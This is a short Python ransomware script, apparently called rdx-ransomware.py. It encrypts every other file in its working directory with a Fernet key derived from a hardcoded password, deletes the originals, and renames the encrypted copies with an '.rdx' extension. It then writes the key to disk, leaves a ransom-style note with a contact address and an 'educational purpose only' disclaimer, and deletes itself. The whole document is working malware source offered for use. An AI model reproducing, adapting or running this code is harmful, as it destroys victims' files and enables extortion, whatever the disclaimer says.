import cryptography
import base64
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
files=[]
for input_file in os.listdir(os.getcwd()):
    files.append(input_file)
files.remove("rdx-ransomware.py")

key = Fernet.generate_key()

password_provided = "Awdasdsad9232#" # This is input in the form of a string
password = password_provided.encode() # Convert to type bytes

salt = os.urandom(16) # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=78643,
    backend=default_backend()
)

key = base64.urlsafe_b64encode(kdf.derive(password)) # Can only use kdf once

for input_file in files:
   output_file=input_file
   with open(input_file, 'rb') as f:
        data = f.read()
   fernet = Fernet(key)
   encrypted = fernet.encrypt(data)
   os.remove(input_file)
   with open(output_file, 'wb') as f:
        f.write(encrypted)
   if output_file.split('.')[1]:
        new_filename = output_file.split('.')[0] +'.'+ output_file.split('.')[1] + '.rdx'
        os.rename(output_file,  new_filename)
file = open('key.key', 'wb')
file.write(key) # The key is type bytes still
file.close()
file=open('NOTE.txt','a')
file.write("Developer Contact : whiterose000@protonmail.com \nThis is for educational purpose only")
file.close()
os.remove("rdx-ransomware.py")
